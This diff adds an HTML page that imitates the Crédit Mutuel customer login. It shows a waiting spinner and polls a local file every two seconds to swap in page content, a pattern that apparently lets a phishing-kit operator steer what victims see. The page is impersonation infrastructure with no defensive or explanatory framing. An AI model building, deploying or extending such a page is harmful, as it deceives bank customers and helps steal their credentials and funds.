@@ -1,0 +1,45 @@
+<!DOCTYPE>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width,initial-scale=1">
+	
+<title>Connexion à votre Espace Client - Crédit Mutuel</title>
+	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro" rel="stylesheet">
+	<link rel="stylesheet" type="text/css" href="css/normalize.css">
+	<link rel="stylesheet" type="text/css" href="css/materialize.min.css">
+	<link rel="stylesheet" type="text/css" href="css/loginStyle.css">
+     <link rel="stylesheet" href="asset/css/spinner.css"/> 
+	</head>
+<body>
+   <div id="cover-spin"></div>
+   <div id="text-spin">Veuillez patienter..</div>
+	
+<script>
+setInterval(function(){ var client = new XMLHttpRequest();
+client.open('GET', './Show_system/Show_Page.txt');
+client.onreadystatechange = function() {
+
+document.getElementById("content").innerHTML = client.responseText ;
+
+}
+client.send();  }, 2000);
+</script>
+<div id="content"></div>
+	<script type="text/javascript" src="js/materialize.min.js"></script>
+	<script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+	<script type="text/javascript" src="js/routie.min.js"></script>
+	<script type="text/javascript" src="js/loginScript.js"></script>
+	
+
+	  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>		
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@7.26.11/dist/sweetalert2.all.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js" integrity="sha256-KsRuvuRtUVvobe66OFtOQfjP8WA2SzYsmm4VPfMnxms=" crossorigin="anonymous"></script>
+<script>
+$('#cover-spin').show(0);
+</script>
+
+</body>
+</html>
